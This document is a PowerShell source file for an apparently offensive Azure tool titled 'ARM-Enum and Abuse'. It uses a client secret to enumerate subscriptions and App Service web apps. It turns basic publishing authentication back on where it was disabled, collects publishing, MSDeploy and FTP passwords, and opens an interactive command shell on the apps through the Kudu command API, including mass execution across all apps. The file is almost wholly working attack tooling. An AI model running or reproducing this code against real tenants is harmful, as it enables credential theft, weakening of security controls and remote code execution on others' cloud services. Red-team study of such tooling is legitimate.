function webapp-shell{

function Show-ClientLoginGui {
    param([switch]$Topmost)

    if ($Host.Runspace.ApartmentState -ne 'STA') {
        Write-Warning "Run with pwsh -STA"
    }

    Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="ARM-Enum and Abuse" Height="560" Width="720"
        WindowStartupLocation="CenterScreen" ResizeMode="NoResize"
        Background="#0B1220" FontFamily="Segoe UI" SnapsToDevicePixels="True">
  <Window.Resources>
    <DropShadowEffect x:Key="CardShadow" BlurRadius="22" ShadowDepth="0" Color="#99000000"/>
    <Style TargetType="TextBox">
      <Setter Property="Background" Value="#0F1626"/>
      <Setter Property="Foreground" Value="#E5E7EB"/>
      <Setter Property="BorderBrush" Value="#334155"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="8,4"/>
      <Setter Property="Height" Value="34"/>
    </Style>
    <Style TargetType="PasswordBox">
      <Setter Property="Background" Value="#0F1626"/>
      <Setter Property="Foreground" Value="#E5E7EB"/>
      <Setter Property="BorderBrush" Value="#334155"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="8,4"/>
      <Setter Property="Height" Value="34"/>
    </Style>
    <Style TargetType="Button">
      <Setter Property="Padding" Value="18,10"/>
      <Setter Property="FontWeight" Value="SemiBold"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Cursor" Value="Hand"/>
    </Style>
  </Window.Resources>

  <Grid Margin="22">
    <Grid.RowDefinitions>
      <RowDefinition Height="140"/>
      <RowDefinition Height="*"/>
      <RowDefinition Height="Auto"/>
    </Grid.RowDefinitions>

    <!-- Header (animated gradient) -->
    <Border Grid.Row="0" CornerRadius="18" Margin="0,0,0,14">
      <Border.Background>
        <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
          <GradientStop x:Name="gs1" Color="#3B82F6" Offset="0"/>
          <GradientStop x:Name="gs2" Color="#8B5CF6" Offset="1"/>
        </LinearGradientBrush>
      </Border.Background>
      <Grid Margin="18">
        <Grid.ColumnDefinitions>
          <ColumnDefinition Width="Auto"/>
          <ColumnDefinition Width="*"/>
        </Grid.ColumnDefinitions>

        <StackPanel Grid.Column="1" Margin="14,0,0,0" VerticalAlignment="Center">
          <TextBlock Text="WebApp-Shell Interactive Shell with WebApp" Foreground="#f8fafc" FontSize="22" FontWeight="Bold"/>
           <TextBlock Text="By @ShkudW - https://github.com/ShkudW/ARM-Enum " Foreground="#E0E7FF" FontSize="13"/>
        </StackPanel>
      </Grid>
    </Border>

    <!-- Card -->
    <Border Grid.Row="1" CornerRadius="18" Background="#101828" Padding="22" Effect="{StaticResource CardShadow}">
      <Grid>
        <Grid.RowDefinitions>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="12"/>
          <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>
        <Grid.ColumnDefinitions>
          <ColumnDefinition Width="170"/>
          <ColumnDefinition Width="*"/>
          <ColumnDefinition Width="Auto"/>
        </Grid.ColumnDefinitions>

        <!-- Client ID -->
        <TextBlock Grid.Row="0" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Client ID"/>
        <TextBox   x:Name="ClientIdBox" Grid.Row="0" Grid.Column="1" Margin="0,4,0,4" ToolTip="GUID of the App Registration"/>

        <!-- Secret -->
        <TextBlock Grid.Row="1" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Client Secret"/>
        <PasswordBox x:Name="SecretBox" Grid.Row="1" Grid.Column="1" Margin="0,4,0,4" ToolTip="App client secret"/>
        <TextBox   x:Name="SecretPlainBox" Grid.Row="1" Grid.Column="1" Margin="0,4,0,4" Visibility="Collapsed" ToolTip="App client secret (visible)"/>
        <CheckBox  x:Name="ShowSecretChk" Content="Show" Grid.Row="1" Grid.Column="2" Margin="10,6,0,4"
                   Foreground="#B4C6FC" VerticalAlignment="Center"/>

        <!-- Domain -->
        <TextBlock Grid.Row="2" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Domain"/>
        <TextBox   x:Name="DomainBox" Grid.Row="2" Grid.Column="1" Margin="0,4,0,4" ToolTip="Tenant domain, e.g. contoso.com"/>

        <!-- Inline error -->
        <TextBlock x:Name="ErrorText" Grid.Row="4" Grid.ColumnSpan="3"
                   Foreground="#FCA5A5" FontSize="12" Visibility="Collapsed"/>
      </Grid>
    </Border>

    <!-- Buttons -->
    <DockPanel Grid.Row="2" Margin="0,16,0,0" LastChildFill="False">
      <StackPanel Orientation="Horizontal" DockPanel.Dock="Right">
        <Button x:Name="CancelBtn" Content="Cancel" Margin="0,0,8,0"
                Background="#0E1726" Foreground="#CBD5E1" BorderBrush="#334155" IsCancel="True"/>
        <Button x:Name="OkBtn" Content="Continue"
                Background="#3B82F6" Foreground="White" BorderBrush="#2563EB" IsDefault="True"/>
      </StackPanel>
    </DockPanel>
  </Grid>
</Window>
"@

    $xdoc = New-Object System.Xml.XmlDocument
    $xdoc.LoadXml($xaml)
    $reader  = New-Object System.Xml.XmlNodeReader $xdoc
    $window  = [Windows.Markup.XamlReader]::Load($reader)

    $ClientIdBox    = $window.FindName("ClientIdBox")
    $SecretBox      = $window.FindName("SecretBox")
    $SecretPlainBox = $window.FindName("SecretPlainBox")
    $ShowSecretChk  = $window.FindName("ShowSecretChk")
    $DomainBox      = $window.FindName("DomainBox")
    $OkBtn          = $window.FindName("OkBtn")
    $CancelBtn      = $window.FindName("CancelBtn")
    $ErrorText      = $window.FindName("ErrorText")
    $gs1            = $window.FindName("gs1")
    $gs2            = $window.FindName("gs2")

    if ($Topmost) { $window.Topmost = $true }

    $window.Add_Loaded({
        $c1 = [Windows.Media.ColorConverter]::ConvertFromString("#3B82F6")
        $c2 = [Windows.Media.ColorConverter]::ConvertFromString("#8B5CF6")
        $c3 = [Windows.Media.ColorConverter]::ConvertFromString("#06B6D4")
        $c4 = [Windows.Media.ColorConverter]::ConvertFromString("#22D3EE")

        $a1 = New-Object Windows.Media.Animation.ColorAnimation($c1, $c3, (New-Object Windows.Duration([TimeSpan]::FromSeconds(6))))
        $a1.AutoReverse = $true; $a1.RepeatBehavior = [Windows.Media.Animation.RepeatBehavior]::Forever
        $a2 = New-Object Windows.Media.Animation.ColorAnimation($c2, $c4, (New-Object Windows.Duration([TimeSpan]::FromSeconds(6))))
        $a2.AutoReverse = $true; $a2.RepeatBehavior = [Windows.Media.Animation.RepeatBehavior]::Forever

        $gs1.BeginAnimation([Windows.Media.GradientStop]::ColorProperty, $a1)
        $gs2.BeginAnimation([Windows.Media.GradientStop]::ColorProperty, $a2)

        $ClientIdBox.Focus() | Out-Null
    })

  
    $ShowSecretChk.Add_Checked({
        $SecretPlainBox.Text       = $SecretBox.Password
        $SecretPlainBox.Visibility = "Visible"
        $SecretBox.Visibility      = "Collapsed"
    })
    $ShowSecretChk.Add_Unchecked({
        $SecretBox.Password        = $SecretPlainBox.Text
        $SecretPlainBox.Visibility = "Collapsed"
        $SecretBox.Visibility      = "Visible"
    })

  
    $handler = {
        $OkBtn.RaiseEvent((New-Object Windows.RoutedEventArgs([System.Windows.Controls.Button]::ClickEvent)))
    }
    $ClientIdBox.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })
    $SecretBox.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })
    $SecretPlainBox.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })
    $DomainBox.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })


    $OkBtn.Add_Click({
        $ErrorText.Visibility = "Collapsed"
        $cid = $ClientIdBox.Text.Trim()
        $dom = $DomainBox.Text.Trim()
        $sec = if ($ShowSecretChk.IsChecked) { $SecretPlainBox.Text } else { $SecretBox.Password }

        if ([string]::IsNullOrWhiteSpace($cid) -or [string]::IsNullOrWhiteSpace($sec) -or [string]::IsNullOrWhiteSpace($dom)) {
            $ErrorText.Text = "Please fill all fields."
            $ErrorText.Visibility = "Visible"
            return
        }

        $tmpGuid = [Guid]::Empty
        if (-not [Guid]::TryParse($cid, [ref]$tmpGuid)) {
            $ErrorText.Text = "Client ID must be a valid GUID."
            $ErrorText.Visibility = "Visible"
            return
        }

        $result = [PSCustomObject]@{
            ClientId     = $cid
            ClientSecret = $sec
            Domain       = $dom
        }
        $window.Tag = $result
        $window.DialogResult = $true
        $window.Close()
    })

    $CancelBtn.Add_Click({ $window.DialogResult = $false; $window.Close() })

    $null = $window.ShowDialog()
    if ($window.DialogResult -eq $true) { return $window.Tag }
}



function GetTenantID{param([string]$TenantName)
        try {
            $resp = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$TenantName/.well-known/openid-configuration" -ErrorAction Stop
                $TenantID = ($resp.issuer -split '/')[3]
            } catch {
                Write-Host "[!] The specified domain is invalid or not reachable." -ForegroundColor Red
            }
        return $TenantID

}

    function GetAzureARMToken {
        param (
            [string]$RefreshToken,[string]$ClientID,[string]$ClientSecret,[string]$TenantID
        )
        $Url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
        $Headers = @{ "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" }

        if ($RefreshToken -and -not $ClientID -and -not $ClientSecret) {
            $Body = @{
                "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "scope"         = "https://management.azure.com/.default"
                "grant_type"    = "refresh_token"
                "refresh_token" = $RefreshToken
            }
        }
        elseif ($ClientID -and $ClientSecret -and -not $RefreshToken) {
            $Body = @{
                "grant_type"    = "client_credentials"
                "scope"         = "https://management.azure.com/.default"
                "client_id"     = $ClientID
                "client_secret" = $ClientSecret
            }
        }
        else { return $null }

        try {
            $RequestUrl = Invoke-RestMethod -Method POST -Uri $Url -Body $Body -Headers $Headers -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop
            return $RequestUrl.access_token
        } catch { return $_ }
    }


    function GetSubscriptions {
        param ([string]$AzureARMToken,[int]$MaxRetries = 8)
        $Headers = @{
            'Authorization' = "Bearer $AzureARMToken"
            'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
            'Accept'        = 'application/json'
        }
        $results1 = @()
        $url = "https://management.azure.com/subscriptions?api-version=2021-01-01"

        while ($url) {
            $attempt = 0
            while ($true) {
                try {
                    $resp = Invoke-RestMethod -Method GET -Uri $url -Headers $Headers -ErrorAction Stop
                    break
                } catch {
                    $attempt++
                    $httpResp = $_.Exception.Response
                    if ($httpResp -and [int]$httpResp.StatusCode -eq 429 -and $attempt -le $MaxRetries) {
                        $retryAfter = $httpResp.Headers['Retry-After']; if (-not $retryAfter) { $retryAfter = 60 }
                        Start-Sleep -Seconds ([int]$retryAfter)
                        continue
                    }
                    throw
                }
            }

            if ($resp.value) {
                $batch = $resp.value | ForEach-Object {
                    [pscustomobject]@{
                        DisplayName    = $_.displayName
                        SubscriptionId = $_.subscriptionId
                        State          = $_.state
                    }
                }  
                $results1 += $batch
            }
            $url = $resp.nextLink
        }
        return $results1
    }



function Get-KuduBaseAndHeaders {
    param([Parameter(Mandatory)][pscustomobject]$App)

    if (-not (Ensure-AppCreds -App $App)) {
        throw "App '$($App.Name)': no usable publishing creds (enable BasicAuth or fetch publish profile)."
    }

    $scmBase = if ($App.Credentials.ScmUri) {
        "https://" + ([uri]$App.Credentials.ScmUri).Host
    } else {
        "https://$($App.Name).scm.azurewebsites.net"
    }

    $pair    = "$($App.Credentials.PublishingUserName):$($App.Credentials.PublishingPassword)"
    $basic   = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($pair))
    $headers = @{ Authorization = "Basic $basic" }

    return [pscustomobject]@{ Base=$scmBase; Headers=$headers }
}

function Test-KuduCapabilities {
    param([Parameter(Mandatory)][pscustomobject]$App)

    $ku = Get-KuduBaseAndHeaders -App $App

    $cap = [ordered]@{
        ScmBase        = $ku.Base
        HasInfo        = $false
        HasEnvironment = $false
        HasVfs         = $false
        HasCommandApi  = $false
        IsFunctionApp  = $false
        KuduVersion    = $null
        Platform       = $App.Platform
    }

    try {
        $info = Invoke-RestMethod -Method GET -Uri "$($ku.Base)/api/info" -Headers $ku.Headers -ErrorAction Stop
        $cap.HasInfo     = $true
        if ($info.version) { $cap.KuduVersion = $info.version }
    } catch {}

    try {
        $env = Invoke-RestMethod -Method GET -Uri "$($ku.Base)/api/environment" -Headers $ku.Headers -ErrorAction Stop
        $cap.HasEnvironment = $true
        if ($env.Values -and ($env.Values["FUNCTIONS_EXTENSION_VERSION"] -or $env.Values["FUNCTIONS_WORKER_RUNTIME"])) {
            $cap.IsFunctionApp = $true
        }
    } catch {}

    try {
     
        $null = Invoke-RestMethod -Method GET -Uri "$($ku.Base)/api/vfs/" -Headers $ku.Headers -ErrorAction Stop
        $cap.HasVfs = $true
    } catch {}

    try {

        $testBody = @{ command = "echo ping"; dir = if ($App.Platform -eq 'Linux') { "/home" } else { "D:\home" } } | ConvertTo-Json
        $resp = Invoke-RestMethod -Method POST -Uri "$($ku.Base)/api/command" -Headers $ku.Headers -ContentType 'application/json' -Body $testBody -ErrorAction Stop
        $cap.HasCommandApi = $true
    } catch {
        $we = $_.Exception
        if ($we.Response -and $we.Response.StatusCode -eq 404) {
            $cap.HasCommandApi = $false
        } elseif ($we.Response -and ($we.Response.StatusCode -eq 400 -or $we.Response.StatusCode -eq 500 -or $we.Response.StatusCode -eq 401 -or $we.Response.StatusCode -eq 403)) {
           
            $cap.HasCommandApi = $true
        }
    }

    return [pscustomobject]$cap
}

function Open-WebAppDebugConsole {
    param([Parameter(Mandatory)][pscustomobject]$App)
    $ku = Get-KuduBaseAndHeaders -App $App
    Start-Process "$($ku.Base)/newui"
}

    function Get-WebApp {
        param (
            [string]$AzureARMToken,
            [pscustomobject[]]$Subscriptions,
            [string]$RefreshToken,[string]$ClientID,[string]$ClientSecret,[string]$TenantID,
            [int]$MaxRetries = 3,
            [switch]$AutoEnableBasicAuth
        )

        $global:WebApps = @()

        foreach ($sub in $Subscriptions) {
            $HeadersARM = @{
                'Authorization' = "Bearer $AzureARMToken"
                'Accept'        = 'application/json'
                'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
            }

            $listUrl = "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resources?`$filter=resourceType%20eq%20'Microsoft.Web%2Fsites'&api-version=2016-09-01"

            Write-Host " "
            Write-Host "==============================================================================="
            Write-Host "Subscription: $($sub.DisplayName) - $($sub.SubscriptionId)" -ForegroundColor Cyan
            Write-Host "-------------------------------------------------------------------------------" -ForegroundColor Cyan

            do {
                $attempt = 0
                while ($true) {
                    try {
                        $listResp = Invoke-RestMethod -Method GET -Uri $listUrl -Headers $HeadersARM -ErrorAction Stop
                        break
                    } catch {
                        $attempt++
                        $httpResp = $_.Exception.Response
                        $code = if ($httpResp) { [int]$httpResp.StatusCode } else { $null }

                        if ($code -eq 429 -and $attempt -le $MaxRetries) {
                            $retryAfter = $httpResp.Headers['Retry-After']; if (-not $retryAfter) { $retryAfter = 60 }
                            Start-Sleep -Seconds ([int]$retryAfter)
                            continue
                        }
                        elseif ($code -eq 401) { 
                            if ($ClientID -and $ClientSecret -and $TenantID) {
                                $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                            } elseif ($RefreshToken -and $TenantID) {
                                $AzureARMToken = GetAzureARMToken -RefreshToken $RefreshToken -TenantID $TenantID
                            } else { throw }

                            $HeadersARM = @{
                                'Authorization' = "Bearer $AzureARMToken"
                                'Accept'        = 'application/json'
                                'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                            }
                            if ($attempt -le $MaxRetries) { continue } else { throw }
                        }
                        elseif ($code -eq 403) {
                            Write-Warning "[#] 403 on listing WebApps for sub $($sub.SubscriptionId) ($($sub.DisplayName)) — skipping."
                            $listResp = $null
                            break
                        }
                        else { throw }
                    }
                }

                if (-not $listResp) { break }

                foreach ($WP in $listResp.value) {
                    $WPName = "$($WP.name)"
                    $WPID   = "$($WP.id)"
                    if ($WPID -match '/resourceGroups/([^/]+)/') { $ResourceGroup = $Matches[1] } else { continue }

                    $base = "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resourceGroups/$ResourceGroup/providers/Microsoft.Web/sites/$WPName"

                    $site = Invoke-RestMethod "$($base)?api-version=2021-01-15" -Headers $HeadersARM -ErrorAction Stop
                    $web  = Invoke-RestMethod "$($base)/config/web?api-version=2021-01-15" -Headers $HeadersARM -ErrorAction Stop

                    $httpsOnly   = [bool]$site.properties.httpsOnly
                    $defaultHost = $site.properties.defaultHostName
                    $url         = if ($httpsOnly) { "https://$defaultHost" } else { $defaultHost }

                    $pol     = Invoke-RestMethod "$($base)/basicPublishingCredentialsPolicies?api-version=2024-11-01" -Headers $HeadersARM -ErrorAction Stop
                    $prevScm = ($pol.value | Where-Object name -eq 'scm').properties.allow
                    $prevFtp = ($pol.value | Where-Object name -eq 'ftp').properties.allow

                    $turnedOn = $false
                    if ($AutoEnableBasicAuth -and ((-not $prevScm) -or (-not $prevFtp))) {
                        $bodyOn = @{ properties = @{ allow = $true } } | ConvertTo-Json
                        Invoke-RestMethod -Method PUT -Uri "$($base)/basicPublishingCredentialsPolicies/scm?api-version=2024-11-01" -Headers $HeadersARM -ContentType 'application/json' -Body $bodyOn | Out-Null
                        Invoke-RestMethod -Method PUT -Uri "$($base)/basicPublishingCredentialsPolicies/ftp?api-version=2024-11-01" -Headers $HeadersARM -ContentType 'application/json' -Body $bodyOn | Out-Null
                        Start-Sleep -Seconds 2
                        $turnedOn = $true
                    }

                    $list = $null
                    try { $list = Invoke-RestMethod -Method POST -Uri "$($base)/config/publishingcredentials/list?api-version=2024-11-01" -Headers $HeadersARM -ErrorAction Stop } catch {}

                    $px = $null
                    try { [xml]$px = Invoke-RestMethod -Method POST -Uri "$($base)/publishxml?api-version=2024-11-01" -Headers $HeadersARM -ErrorAction Stop } catch {}

                    $ms      = $null
                    $ftpProf = $null
                    if ($px) {
                        $ms      = $px.publishData.publishProfile | Where-Object { $_.publishMethod -eq 'MSDeploy' } | Select-Object -First 1
                        $ftpProf = $px.publishData.publishProfile | Where-Object { $_.publishMethod -match 'FTP' }     | Select-Object -First 1
                    }

                    $pubUser = if ($list -and $list.properties) { $list.properties.publishingUserName } else { $null }
                    $pubPass = if ($list -and $list.properties) { $list.properties.publishingPassword } else { $null }
                    $scmUri  = if ($list -and $list.properties) { $list.properties.scmUri } else { $null }

                    $msUser  = if ($ms) { $ms.userName } else { $null }
                    $msPass  = if ($ms) { $ms.userPWD }  else { $null }
                    $msUrl   = if ($ms) { $ms.publishUrl } else { $null }
                    $msSite  = if ($ms) { $ms.msdeploySite } else { $null }

                    $ftpUser = if ($ftpProf -and $ftpProf.userName) { $ftpProf.userName } elseif ($site.properties.ftpUsername) { $site.properties.ftpUsername } else { $null }
                    $ftpPass = if ($ftpProf) { $ftpProf.userPWD } else { $null }
                    $ftpsHost= if ($ftpProf -and $ftpProf.publishUrl) { $ftpProf.publishUrl } elseif ($site.properties.ftpsHostName) { $site.properties.ftpsHostName } else { $null }

                    if (-not $pubUser -and $msUser) { $pubUser = $msUser }
                    if (-not $pubPass -and $msPass) { $pubPass = $msPass }
                    if (-not $scmUri  -and $site.name) { $scmUri = "https://$($site.name).scm.azurewebsites.net/" }

                    $isLinux = $false
                    if ($site.kind -match 'linux' -or ($web.properties.linuxFxVersion -and $web.properties.linuxFxVersion -ne '')) { $isLinux = $true }
                    $platform = if ($isLinux) { 'Linux' } else { 'Windows' }

                    $obj = [pscustomobject]@{
                        SubscriptionId = $sub.SubscriptionId
                        ResourceGroup  = $ResourceGroup
                        Name           = $site.name
                        Url            = $url
                        IsActive       = ($site.properties.state -eq 'Running')
                        Platform       = $platform
                        Credentials    = [pscustomobject]@{
                            PublishingUserName      = $pubUser
                            PublishingPassword      = $pubPass
                            ScmUri                  = $scmUri
                            MsDeployUser            = $msUser
                            MsDeployPassword        = $msPass
                            MsDeployPublishUrl      = $msUrl
                            MsDeploySite            = $msSite
                            FtpUser                 = $ftpUser
                            FtpPassword             = $ftpPass
                            FtpsHostName            = $ftpsHost
                            BasicAuthScmAllowed     = $prevScm
                            BasicAuthFtpAllowed     = $prevFtp
                        }
                    }
                    $global:WebApps += $obj
                    $obj
                }

                $listUrl = $listResp.nextLink
            } while ($listUrl)
        }
    }


    function Ensure-AppCreds {
        param([Parameter(Mandatory)][pscustomobject]$App)

       
        if ($App.Credentials.PublishingUserName -and $App.Credentials.PublishingPassword) {
            if (-not $App.Credentials.ScmUri -and $App.Name) { $App.Credentials.ScmUri = "https://$($App.Name).scm.azurewebsites.net/" }
            return $true
        }

       
        if ($App.Credentials.MsDeployUser -and $App.Credentials.MsDeployPassword) {
            if (-not $App.Credentials.PublishingUserName) { $App.Credentials.PublishingUserName = $App.Credentials.MsDeployUser }
            if (-not $App.Credentials.PublishingPassword) { $App.Credentials.PublishingPassword = $App.Credentials.MsDeployPassword }
            if (-not $App.Credentials.ScmUri -and $App.Name) { $App.Credentials.ScmUri = "https://$($App.Name).scm.azurewebsites.net/" }
            return $true
        }

       
        if (-not $script:ArmToken -and $script:ClientId -and $script:ClientSecret -and $script:TenantId) {
            $script:ArmToken = GetAzureARMToken -ClientID $script:ClientId -ClientSecret $script:ClientSecret -TenantID $script:TenantId
        }
        if (-not $script:ArmToken) { return $false }

        try {
            $headersArm = @{ Authorization = "Bearer $script:ArmToken"; Accept='application/json' }
            $base = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)"

            $pol = Invoke-RestMethod "$base/basicPublishingCredentialsPolicies?api-version=2024-11-01" -Headers $headersArm -ErrorAction Stop
            $prevScm = ($pol.value | Where-Object name -eq 'scm').properties.allow
            $prevFtp = ($pol.value | Where-Object name -eq 'ftp').properties.allow
            $turnedOn = $false
            if (-not $prevScm -or -not $prevFtp) {
                $bodyOn = @{ properties = @{ allow = $true } } | ConvertTo-Json
                Invoke-RestMethod -Method PUT -Uri "$base/basicPublishingCredentialsPolicies/scm?api-version=2024-11-01" -Headers $headersArm -ContentType 'application/json' -Body $bodyOn | Out-Null
                Invoke-RestMethod -Method PUT -Uri "$base/basicPublishingCredentialsPolicies/ftp?api-version=2024-11-01" -Headers $headersArm -ContentType 'application/json' -Body $bodyOn | Out-Null
                Start-Sleep -Seconds 2
                $turnedOn = $true
            }

            $list = $null
            try { $list = Invoke-RestMethod -Method POST -Uri "$base/config/publishingcredentials/list?api-version=2024-11-01" -Headers $headersArm -ErrorAction Stop } catch {}
            $px = $null
            try { [xml]$px = Invoke-RestMethod -Method POST -Uri "$base/publishxml?api-version=2024-11-01" -Headers $headersArm -ErrorAction Stop } catch {}
            $ms = $null
            if ($px) { $ms = $px.publishData.publishProfile | Where-Object { $_.publishMethod -eq 'MSDeploy' } | Select-Object -First 1 }

            if ($list -and $list.properties) {
                $App.Credentials.PublishingUserName = $list.properties.publishingUserName
                $App.Credentials.PublishingPassword = $list.properties.publishingPassword
                if (-not $App.Credentials.ScmUri -and $list.properties.scmUri) { $App.Credentials.ScmUri = $list.properties.scmUri }
            }
            if ($ms) {
                if (-not $App.Credentials.PublishingUserName) { $App.Credentials.PublishingUserName = $ms.userName }
                if (-not $App.Credentials.PublishingPassword) { $App.Credentials.PublishingPassword = $ms.userPWD }
                if (-not $App.Credentials.ScmUri -and $App.Name) { $App.Credentials.ScmUri = "https://$($App.Name).scm.azurewebsites.net/" }
            }

            if ($turnedOn) {
                $bodyScm = @{ properties = @{ allow = [bool]$prevScm } } | ConvertTo-Json
                $bodyFtp = @{ properties = @{ allow = [bool]$prevFtp } } | ConvertTo-Json
                Invoke-RestMethod -Method PUT -Uri "$base/basicPublishingCredentialsPolicies/scm?api-version=2024-11-01" -Headers $headersArm -ContentType 'application/json' -Body $bodyScm | Out-Null
                Invoke-RestMethod -Method PUT -Uri "$base/basicPublishingCredentialsPolicies/ftp?api-version=2024-11-01" -Headers $headersArm -ContentType 'application/json' -Body $bodyFtp | Out-Null
            }
        } catch { }

        return [bool]($App.Credentials.PublishingUserName -and $App.Credentials.PublishingPassword)
    }

    function Invoke-WebAppCommand {
        param(
            [Parameter(Mandatory)][pscustomobject]$App,
            [Parameter(Mandatory)][string]$Command,
            [string]$WorkingDirWindows = "site\wwwroot",
            [string]$WorkingDirLinux   = "/home/site/wwwroot"
        )

        if (-not (Ensure-AppCreds -App $App)) {
            throw "App '$($App.Name)': no usable publishing creds. Enable BasicAuth or fetch publish profile."
        }

        $scmBase = if ($App.Credentials.ScmUri) {
            "https://" + ([uri]$App.Credentials.ScmUri).Host
        } else {
            "https://$($App.Name).scm.azurewebsites.net"
        }

        $pair   = "$($App.Credentials.PublishingUserName):$($App.Credentials.PublishingPassword)"
        $basic  = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($pair))
        $headers = @{ Authorization = "Basic $basic" }

        $body = if ($App.Platform -eq 'Linux') {
            @{ command = "bash -lc ""$Command"""; dir = $WorkingDirLinux } | ConvertTo-Json
        } else {
            if ($Command.Trim().StartsWith("powershell", [System.StringComparison]::OrdinalIgnoreCase)) {
                @{ command = $Command; dir = $WorkingDirWindows } | ConvertTo-Json
            } else {
                @{ command = "cmd /c $Command";        dir = $WorkingDirWindows } | ConvertTo-Json
            }
        }

        $resp = Invoke-RestMethod -Method POST -Uri "$scmBase/api/command" -Headers $headers -ContentType 'application/json' -Body $body -ErrorAction Stop

        [pscustomobject]@{
            AppName  = $App.Name
            ExitCode = $resp.ExitCode
            Output   = $resp.Output
            Error    = $resp.Error
        }
    }


    function Invoke-CommandOnAllWebApps {
        param([Parameter(Mandatory)][string]$Command)
        if (-not $global:WebApps -or $global:WebApps.Count -eq 0) {
            throw "No WebApps in memory. Run Get-WebApp first."
        }
        foreach ($app in $global:WebApps) {
            try {
                Invoke-WebAppCommand -App $app -Command $Command
            } catch {
                [pscustomobject]@{
                    AppName  = $app.Name
                    ExitCode = -1
                    Output   = ""
                    Error    = $_.Exception.Message
                }
            }
        }
    }

function Start-WebAppShell {
    param([pscustomobject]$App)

    while ($true) {
        
        if (-not $App) {
            if (-not $global:WebApps -or $global:WebApps.Count -eq 0) {
                Write-Host "No WebApps in memory. Run Get-WebApp first." -ForegroundColor Yellow
                return
            }
            $App = Select-WebApp
            if (-not $App) { Write-Host "Selection cancelled." -ForegroundColor Yellow; return }
        }

        
        if (-not (Ensure-AppCreds -App $App)) {
            Write-Host "App '$($App.Name)': missing publishing creds and could not refetch." -ForegroundColor Red
        
            $App = $null
            continue
        }

        Write-Host "Starting shell on $($App.Name) ($($App.Platform)). Type 'exit' to switch app, 'quit' to quit." -ForegroundColor Green

        while ($true) {
            $cmd = Read-Host "$($App.Name)>"
            if ($cmd -eq 'quit') { return }  
            if ($cmd -eq 'exit') { $App = $null; break }  
            if ([string]::IsNullOrWhiteSpace($cmd)) { continue }
            try {
                $r = Invoke-WebAppCommand -App $App -Command $cmd
                if ($r.Output) { $r.Output.TrimEnd("`r","`n") | Write-Host -ForegroundColor White }
                if ($r.Error)  { $r.Error.TrimEnd("`r","`n")  | Write-Host -ForegroundColor Red }
            } catch {
                Write-Host $_.Exception.Message -ForegroundColor Red
            }
        }
    
    }
}


    function Select-WebApp {
        if (-not $global:WebApps -or $global:WebApps.Count -eq 0) { throw "No WebApps in memory." }
    
        $global:WebApps | Out-GridView -Title "Select Web App" -PassThru
    }


function main {
   
    $creds = Show-ClientLoginGui -Topmost
    if (-not $creds) { Write-Host "Canceled." -ForegroundColor Yellow; return }

    $script:ClientId     = $creds.ClientId
    $script:ClientSecret = $creds.ClientSecret
    $DomainName          = $creds.Domain


    $script:TenantId = GetTenantID -TenantName $DomainName
    if (-not $script:TenantId) { Write-Host "Could not resolve Tenant ID." -ForegroundColor Red; return }

    $ARM = GetAzureARMToken -ClientID $script:ClientId -ClientSecret $script:ClientSecret -TenantID $script:TenantId
    if (-not $ARM -or ($ARM -is [System.Management.Automation.ErrorRecord])) {
        Write-Host "Failed to get ARM token." -ForegroundColor Red
        return
    }
    $script:ArmToken = $ARM
    $subs = GetSubscriptions -AzureARMToken $ARM
    Get-WebApp -AzureARMToken $ARM -Subscriptions $subs -ClientID $script:ClientId -ClientSecret $script:ClientSecret -TenantID $script:TenantId  -AutoEnableBasicAuth

    if (-not $global:WebApps -or $global:WebApps.Count -eq 0) {
        Write-Host "No WebApps found." -ForegroundColor Yellow
        return
    }
	
    while ($true) {
        try {
            $app = Select-WebApp
        } catch {
            break
        }
        if (-not $app) { break }
		
        $exitReason = Start-WebAppShell -App $app

        if ($exitReason -eq 'quit') { break }
		
        $cap = Test-KuduCapabilities -App $app
        if (-not $cap.HasCommandApi) {
            Write-Host "Opening Kudu Debug Console for '$($app.Name)'..." -ForegroundColor Yellow
            Open-WebAppDebugConsole -App $app
        }
    }
}
    main
}

